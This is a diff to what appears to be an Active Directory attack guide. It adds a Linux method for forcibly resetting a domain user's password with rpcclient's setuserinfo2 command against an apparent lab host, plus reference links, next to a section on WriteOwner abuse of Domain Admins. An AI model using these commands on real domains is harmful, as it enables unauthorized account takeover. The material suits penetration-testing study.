@@ -157,6 +157,19 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 
 ![](../../.gitbook/assets/16.png)
 
+and one last way yo achieve this from linux:
+
+```markup
+rpcclient -U KnownUsername 10.10.10.192
+> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
+```
+
+More info:
+
+* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
+* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
+* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)
+
 ## WriteOwner on Group
 
 Note how before the attack the owner of `Domain Admins` is `Domain Admins`:
